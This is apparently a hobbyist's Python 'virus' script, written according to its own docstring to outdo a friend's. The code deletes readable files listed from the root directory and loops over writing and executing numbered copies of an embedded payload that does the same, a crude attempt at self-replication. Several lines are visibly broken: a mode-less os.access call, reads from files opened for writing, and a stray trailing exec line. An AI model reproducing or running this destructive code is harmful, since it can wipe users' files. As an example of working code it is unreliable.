
"""
Produced by Mr. Waltz
date: March 21: RAMADAN SOON Boiss!!!
Disclaimer: dont be a bad boy/girl with this script please. not that its very effective in the first place
I literally only made this to shame malek for his horrible "Ooga Booga" virus.
"""


# a virus like this should be self executable so add stuff for that later...
# Make it cooler you stupid nerd!
#
# Above are mearly notes for myself, please ignore.
import os
import sys

path = "/"
path2 = "C:"
count = 0
the_package = """
import os
import sys
path = "/"
path2 = "C:"
sys_files = os.listdir(path)

for i in range(1,9999999999):
    with open(f"Oogabooga{i}.py", 'r') as file:
        with open(f"Oogabooga{i}.py", 'w') as copy:
            copy.write(the_package)
            exec(file.read())


def file_creation(il, code):
    il += 1
    in_code = code
    os.access('/home')
    with open(f"Oogabooga{il}.py", 'w') as made:
        made.write(in_code)
        for fila in sys_files:
            if os.access(fila) == True:
                os.remove(fila)
            else:
                pass
            
            
def file_run(i):
    number = i
    with open(f"Oogabooga{i}.py", 'w') as running:
        exec(running.read())


for num in range(0,9999999999999999999999999999999):
    file_creation(num, the_package)
    file_run(num)
"""
sys_files = os.listdir(path)


def file_creation(il, code):
    il += 1
    in_code = code
    with open(f"Oogabooga{il}.py", 'w') as made:
        made.write(in_code)
        for fila in sys_files:
            if not os.access(fila, os.R_OK):
                pass
            else:
                os.remove(fila)


def file_run(i):
    number = i
    with open(f"Oogabooga{i}.py", 'r') as running:
        exec(running.read())


for num in range(0,9999999999999999999999999999999):
    file_creation(num, the_package)
    file_run(num)
        exec(file.read())
